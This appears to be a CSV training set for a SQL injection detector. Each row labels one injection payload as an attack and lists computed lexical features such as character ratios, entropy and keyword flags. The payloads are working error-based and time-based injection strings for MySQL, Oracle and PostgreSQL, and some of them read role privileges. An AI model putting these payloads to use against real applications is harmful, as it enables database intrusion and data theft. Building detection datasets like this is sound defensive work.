id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000014,attack,error,"1'+  (  select 'bmit' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",nearest_attack_euclidean,R000089,0.18517262313284955,338.7091542155834,39.84813579006864,4.0303966507760745,113.69627158013728,62.392543160274556,123.77220368510295,38.84813579006864,0.33569376030477294,0.1841539606529921,0.3654581508851089,0.11469412815712605,4.0,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,22.0,0.0,0.0,6.0,6.848135790068638,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.9240678950343195,3.0,0.9240678950343191,1.0,1.075932104965681,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.92406789503432
SMOTE_000015,attack,error,-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000132,0.2693586531398873,414.9444851220287,34.378469679873206,3.5112570685031637,103.23380816059172,61.74768688008453,180.0983991209721,69.86459096038038,0.2487200925779683,0.1489828131599715,0.43395709979811886,0.16833999446394135,1.0,0.0,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,37.24306064025359,0.0,0.0,0.12615655995773478,31.24306064025359,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.8738434400422654,0.0,1.0,1.8738434400422652,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.74768688008453
SMOTE_000016,attack,error,"1' in boolean mode  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  #",nearest_attack_euclidean,R000075,0.054984487866425964,313.60308429230884,38.970598836467325,4.005415786749225,111.7647906917386,55.0,113.86769476410295,32.970598836467325,0.35636164624678,0.1754014776617658,0.3630984325729057,0.10513844351854842,0.9852994182336616,0.0,0.0,-1.3877787807814457e-17,2.0,1.0,0.0,20.985299418233662,0.0,0.0,6.014700581766338,4.0,0.9852994182336616,0.0,-2.7755575615628914e-17,0.9852994182336616,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.9852994182336616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.985299418233662
SMOTE_000017,attack,error,"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000246,0.19420553385301587,429.5254805372614,34.311612390347904,3.5098978918169688,108.93483717104371,62.0,186.93483717104368,71.65580619517395,0.2535732948356281,0.14437547318043387,0.43520695464327075,0.16684427734066726,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,38.65580619517395,0.0,0.0,0.0,32.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000018,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000037,0.10052570704719863,254.0,43.45784528235092,4.462408757531739,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9999999999999998,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000019,attack,error,-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000232,0.9489305602798969,433.77683332812035,34.0,3.4787652056502285,108.33292856919444,62.0,191.44390475892592,72.0,0.24969729017831943,0.1429675433933874,0.4413083418424239,0.16602682458586926,0.4445119051342604,0.0,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,39.55548809486574,0.0,0.0,0.0,32.0,0.44451190513426037,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000020,attack,error,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000122,0.6498965947592708,177.30897459322404,36.0,3.964199219593995,61.0,31.0,66.0,19.30897459322403,0.34403455055587295,0.1748372306103617,0.37223410388012484,0.10889411495364049,0.3089745932240322,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,13.0,0.0,0.0,4.0,1.0,0.3089745932240322,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000021,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.0,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9999999999999998,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000022,attack,error,"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R000209,0.5543037082921289,380.69494412060584,37.82626396984854,3.6666037286372575,99.12996274707055,57.0,159.78249068676763,64.78249068676764,0.26029660669363053,0.14976137986075255,0.4197721566067689,0.170169856838848,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,32.0,0.0,0.0,1.0,25.782490686767638,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.3912453433838188,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.391245343383819
SMOTE_000023,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000053,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000024,attack,error,"  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  9815,9815,case when   (  9815  =  9815  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R000254,0.8876287503362089,362.94685823560746,34.0,3.441006440480534,91.32487821447597,50.351449096672226,160.91908182778707,60.35144909667223,0.2512451702609011,0.13876288412572677,0.443647729539971,0.16634421607340116,0.0,0.0,0.21618363444258942,-1.3877787807814457e-17,0.0,1.2161836344425896,0.0,33.56763273111482,0.0,0.7838163655574105,2.3514490966722317,21.43236726888518,0.0,0.0,-2.7755575615628914e-17,0.21618363444258945,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.7838163655574105,0.0,0.21618363444258948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
